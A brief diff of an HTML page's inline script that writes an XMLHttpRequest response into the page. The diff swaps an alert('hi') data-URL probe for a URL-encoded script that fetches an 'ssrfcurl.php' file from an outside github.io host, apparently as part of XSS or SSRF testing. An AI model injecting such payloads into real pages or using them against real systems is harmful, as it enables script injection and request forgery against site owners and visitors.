@@ -23,7 +23,7 @@ alt="Larry" />
         x.onload=function(){
         document.write(this.responseText)
         };
-        x.open("GET",'data:text/html,%3Cscript%3Ealert%28%27hi%27%29%3B%3C%2Fscript%3E');
+        x.open("GET","%3Cscript%3Efetch('https://anyquestions69.github.io/ssrfcurl.php').then(r=%3Er.text()).then(s=%3E%7Bconsole.log(s);alert(s)%7D)");
         x.send();
         </script>
 </html>
